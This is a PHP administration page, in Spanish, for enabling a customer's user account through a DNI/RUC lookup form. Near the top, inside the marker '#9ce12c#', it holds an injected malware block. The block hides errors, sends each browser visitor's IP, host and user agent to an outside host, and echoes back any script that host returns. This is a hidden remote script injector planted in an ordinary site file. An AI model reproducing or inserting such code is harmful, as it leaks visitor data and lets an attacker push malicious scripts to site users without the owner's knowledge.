<?php
	session_start();
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.html");
	}
	include("../conexion/ajax.php");
	/*include("../conexion/baseDatos.php");
	include("../conexion/config.php");*/
?>
<?php
#9ce12c#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/9ce12c#
?>
<script language="javascript" type="text/javascript" >
	function go()
	{
		location.href="administrador.php";
	}
	function buscar()
	{
		cod=document.getElementById('txtCodigo').value;
		/*if(cod.lenght!=8||cod.length!=11||cod.length==0)
		{
			alert("ERROR: Formato incorrecto del DNI/RUC");
			return;
		}*/
		_obj = crearObjeto();
		_url = "ajaxManejador.php";
		_valores = "op=buscarCliente&DniRuc=" + cod;
		_obj.open("POST", _url, true);
		_obj.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); //cabecera post
		_obj.send(_valores);
		_obj.onreadystatechange = function()
		{
			//Carga completa (Estado de la conexion)
			if(_obj.readyState==4)
			{
				//Completadoc no exito (Codigo enviado por el servidor)
				if(_obj.status==200)
				{			
					resp = _obj.responseText;	
					if(resp=="FAILED")
					{
						alert("¡ Comprobante no encontrado !");
						document.getElementById("nombres").value = "";
						document.getElementById("direccion").value = "";												
						document.getElementById("telefono").innerHTML = "";
						document.getElementById("email").innerHTML = "";
						quitarCargando('cargando');
					}
					else
					{
						//agregar informacion	
						//alert("Exito: " + resp);
						resp = resp.split("|");
						document.getElementById("nombres").innerHTML = resp[1];
						document.getElementById("direccion").innerHTML = resp[5];
						document.getElementById("telefono").innerHTML = resp[3];
						document.getElementById("email").innerHTML = resp[4];																													
						quitarCargando('cargando');						
					}
				}
			}
		}
	}
</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Formulario para Crear Cuenta de Usuario para el cliente</title>
</head>

<body>
<table width="800" height="290" border="0" align="center">
  <tr>
    <td height="156" align="center"><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
  </tr>
  <tr>
    <td height="43" align="center"><form id="form1" name="form1" method="post" action="actaHabilitacion.php">
      <table width="328" height="256" border="0">
        <tr>
          <td height="55" colspan="2" align="center"><h2>Habilitar Cuenta de usuario</h2></td>
          </tr>
        <tr>
          <td width="143"><strong><em>DNI/RUC:</em></strong></td>
          <td width="175"><input name="txtCodigo" type="text" id="txtCodigo" maxlength="11" /></td>
        </tr>
        <tr>
          <td align="right"><input type="button" name="button" id="button" value="Buscar"  onclick="buscar()"/></td>
          <td><a href="buscarCliente.php" target="popup" onClick="window.open(this.href, this.target,'width=550,height=500, scrollbars=1'); return false;">Clientes</a></td>
        </tr>
        <tr>
          <td><em><strong>Nombres:</strong></em></td>
          <td><div id="nombres"> </div></td>
        </tr>
        <tr>
          <td><em><strong>Direccion:</strong></em></td>
          <td><div id="direccion"></div></td>
        </tr>
        <tr>
          <td><em><strong>telefono:</strong></em></td>
          <td><div id="telefono"></div></td>
        </tr>
        <tr>
          <td><em><strong>email</strong></em></td>
          <td><div id="email"></div></td>
        </tr>
        <tr>
          <td height="38" align="center"><input type="submit" name="button2" id="button2" value="Habilitar" />
            <strong>
            <input name="op" type="hidden" id="op" value="habilitarUsuario" />
            </strong></td>
          <td align="center"><input type="button" name="button3" id="button3" value="Cancelar" onClick="go()"/></td>
        </tr>
      </table>
    </form></td>
  </tr>
  <tr>
    <td height="21">&nbsp;</td>
  </tr> 
  <tr>
    <td height="21">&nbsp;</td>
  </tr>
</table>
</body>
</html>